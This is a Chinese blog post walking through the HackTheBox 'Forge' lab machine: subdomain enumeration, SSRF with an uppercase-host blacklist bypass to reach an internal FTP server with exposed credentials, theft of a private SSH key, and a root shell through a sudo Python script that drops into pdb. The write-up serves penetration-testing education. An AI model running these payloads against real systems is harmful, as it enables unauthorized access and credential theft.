大家好，我是你们好朋友小峰。陆陆续续为大家推出CTF-Horizontall HackTheBox 系列文章。

## 0X01简介

Forge是一个CTF
Linux盒子，在HackTheBox平台的难度范围内被评为“中等”。该靶场内容涵盖了子域枚举、SSRF攻击和用于特权升级的python脚本的逆向工程。

## 0X02渗透路径

### 2.1信息收集

·Nmap

### 2.2目录列举

·使用wfuzz进行子域枚举

·在Web应用程序上检查文件上传过滤器

### 2.3漏洞利用

·利用SSRF读取私有SSH密钥

·使用此SSH密钥登录

### 2.4权限提升

·了解以sudo运行的python脚本

·通过利用pdb获得根

## 0x03 信息收集

靶场机分配专用IP地址是10.129.164.116。使用nmap端口扫描工具对靶场IP
nmap扫描。我们查看nmap扫描结果，服务器试图将请求重定向到http://forge.htb。我们将在主机文件中添加此IP并访问网络服务器。（如图3.1所示）

    
    
    nmap -sV -sC -p 1-1000 10.129.164.116

![v2-e2e6bef7c423ab4aa630dc54736bdcc9_1440w.png](https://image.3001.net/images/20221028/1666921289_635b3349bd861694b1482.png!small)

图3.1 namp扫描端口

现在，我们访问靶场服务器，该服务器似乎正在运行一个图片画展网站。（如图3.2所示）

![v2-a82d492b717c851558bc3c1499792f4a_1440w.png](https://image.3001.net/images/20221028/1666921291_635b334b26b2fa3ebf60b.png!small)

​图3.2 访问网站页面

## 0x04 目录枚举

正如我们所看到的，图片画展中有一个上传功能。我们尝试上传PHP有效负载并获得反向shell，但没有成功。然而，文件正在上传到服务器，内容在那它没有执行代码。

然而，由于该网站正在重定向到 forge.htb，因此网站上可能还有其他子域。我们为这个暴力使用了wfuzz（以及秘密列表的单词列表）。

    
    
    wfuzz -w /home/kali/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "主机：FUZZ.forge.htb" --sc 200 10.129.164.116

这表明admin.forge.htb存在。（如图4.1所示）

![v2-74c9a07a72b30a2f6214967653791310_1440w.png](https://image.3001.net/images/20221028/1666921291_635b334be20eedc1a1e54.png!small)

图4.1 子域名枚举

然而，在使用curl打开URL时，发现了一个错误。意味着服务器上有一个访问控制过滤器。（如图4.2所示）

    
    
    echo "10.129.164.116 admin.forge.htb" >> /etc/hostscurl http://admin.forge.htb/

![v2-a63b3b7673ea1cb5afdc2f789225ce97_1440w.png](https://image.3001.net/images/20221028/1666921292_635b334cae2a547fec759.png!small)

​图4.2 访问admin页面

因此，我们查看另一个上传选项“可以上传URL网站”。只允许HTTP、HTTPS URL。（如图4.3所示）

![v2-1cd69da6fadb9b07ce7d2c75fcba61e8_1440w.png](https://image.3001.net/images/20221028/1666921293_635b334d9880204a5e81e.png!small)

​图4.3 支持http/https协议访问

我使用netcat在端口80上设置了一个监听器，输入http://10.10.16.10/shell.php使用我的HTB隧道IP。（如图4.4所示）

![1666920856_635b319863c8552049f56.png!small?1666920856990](https://image.3001.net/images/20221028/1666920856_635b319863c8552049f56.png!small?1666920856990)

图4.4 设置htb隧道地址

在我的netcat监听器上，我可以看到试图获取shell.php的网站。这里有一些需要注意的内容：

·服务器试图从我的IP中获取指定的文件shell.php

·请求在主机头中了我的IP

·用户代理是python-requests，这是一个python爬虫（如图4.5所示）

![v2-7413cb53774af871e51045683eca765c_1440w.png](https://image.3001.net/images/20221028/1666921294_635b334e823e3e546dbed.png!small)

图4.5 设置监听反弹访问网站内容

## 0x05 漏洞利用

现在服务器已经建立，服务器试图获取远程文件，我们可以从这里开始渗透。我的第一个想法是使用此远程URL功能访问admin.forge.htb，因为该页面只允许localhost访问。通过访问我们发现了一个新问题。（如图5.1所示）

![v2-ead12e29bb0c44632377f65a351b4eb3_1440w.png](https://image.3001.net/images/20221028/1666921295_635b334f67734c80a416d.png!small)

图5.1访问admin子域禁止黑名单

这个地址被列入黑名单。让我们看看是否可以在所有大写字母（ADMIN.forge.htb）中键入子域“admin”来绕过这一点，这个也是渗透测试中常常绕过waf的方式，尤其是注入、xss等类型的漏洞。通过转换大小写看起来我们现在可以访问admin.forge.htb这个应用网站。这个漏洞被称为SSRF（服务器端请求伪造），攻击者能够篡改服务器上的后端请求，并突破各种访问控制（如这里的本地主机），以访问敏感文件，甚至获得远程shell。（如图5.2所示）

![v2-ca7ceb297bf57321bd4340ed625b1fff_1440w.png](https://image.3001.net/images/20221028/1666921296_635b33503d0617ad6c47f.png!small)

​图5.2 通过大小写绕过本地访问策略

这告诉我一个页面/公告，然后我试图使用http://ADMIN.forge.htb/announcements访问该页面/公告，但这也被列入黑名单。所以，我使用了这个有效载荷：

    
    
    http://ADMIN.FORGE.htb/announcements curl http://forge.htb/uploads/ps14SjF8useIEk0VOao1

从这一结果中推断出的重要关键点如下：

·内部FTP服务器正在运行，其凭据为用户：heightofsecurity123！

·上传文件选项支持FTP和FTPS

·？u=可用于在/uploads页面上上传图像。（如图5.3所示）

![v2-43b5673cbfdb308648b53d5a716bf697_1440w.png](https://image.3001.net/images/20221028/1666921297_635b33513b1e7e48c4b68.png!small)

图5.3 发现ftp服务器登录账号密码

因此，如果/上传方式支持通过URL和FTP协议进行包含，我们可以利用SSRF并访问内部FTP服务器！我使用的有效载荷是（如图5.4所示）

    
    
    http://ADMIN.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/

![v2-6527bf67b383ace22c4dd7322f2f099b_1440w.png](https://image.3001.net/images/20221028/1666921298_635b33522ce23a9b2c6ab.png!small)

​图5.4 登录ftp服务器查看文件列表

现在，如果我能访问user.txt，可能也可以访问私有SSH密钥。我使用这个有效载荷做到了这一点：（如图5.5所示）

    
    
    http://ADMIN.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/.ssh/id_rsa
    

![v2-8e7e7d17f24f4aae0877bf6f3055afc0_1440w.png](https://image.3001.net/images/20221028/1666921299_635b3353385d7449146b2.png!small)

​图5.5 查看ssh的id_rsa密钥

将该密钥保存在我的本地系统中，我们可以登录受害者框。（如图5.6所示）

    
    
    nano id_rsa chmod 600 id_rsa ssh -i id_rsa user@forge.htb

![v2-e32448faecf8fe0f492e2d2ce2ca723f_1440w.png](https://image.3001.net/images/20221028/1666921300_635b33541b8e7f7b04612.png!small)

​图5.6 ssh登录服务器

## 0x06特权升级

现在我们有了一个稳定的用户shell，我们可以持续权限提升。我检查了sudoers文件，该文件有一个python脚本可以作为root运行。此脚本打开了一个监听器，供远程客户端连接。此外，它将输入密码与硬编码的凭据secretadminpassword进行比较（如图6.1所示）

    
    
    sudo -l
    cat /opt/remote-manage.py

![v2-60ecfa9ee8ff8ba1fc8f43426c80b7a4_1440w.png](https://image.3001.net/images/20221028/1666921300_635b3354ea77b6a387798.png!small)

​图6.1发现配置文件账号密码

让我们这样做，然后从另一个终端再次登录此用户，并使用netcat连接到脚本。（如图6.2所示）

    
    
    sudo /usr/bin/python3 /opt/remote-manage.py
    nc localhost 55465

![v2-1303b77f24bfad4d2f26924881f13f6d_1440w.png](https://image.3001.net/images/20221028/1666921301_635b3355e8ca083d24375.png!small)

​图6.2 打开另外一个终端连接服务器

现在，我正在有效地与一个root运行的python脚本进行通信。你会注意到这个脚本还有缺陷。如果我输入“秘密管理员密码”以外的任何内容，它就会抛出异常并打开Python调试器。（如图6.3所示）

![v2-a954e4d2e6ee98ff0bd5f5ddd1d6335b_1440w.png](https://image.3001.net/images/20221028/1666921302_635b3356f096b8c54fcf1.png!small)

​图6.3 python导入os模块

现在，我们有一个Python调试器（pdb）作为root运行。如果这个缺陷不存在，我们会使用缓冲区溢出攻击进入调试器。无论如何，我们可以使用调试器作为root执行任何功能。我在这里使用了gtfobins使用的技术。只需使用os模块调用shell。这就是我们在这个渗透盒子的root权限。
（如图6.4所示）

    
    
    import os;os.system(“/bin/sh”) id cat /root/root.txt

![v2-742aa3f97e0d48e39a756793394816cc_1440w.png](https://image.3001.net/images/20221028/1666921303_635b3357dbaf527047f50.png!small)

图6.4 提升权限为root用户

## 0x07 结论

这个渗透测试靶场虚拟中，我们涵盖了子域枚举、SSRF和基本的Python逆向工程。希望你喜欢这篇文章。

本系列准备开启国内外安全靶场渗透测试系列也欢迎大家投稿包括但不限于VulnStack、Vulnhub、HTB、自行搭建系列靶场。通过靶场快速带领大家学习红队各系列知识。

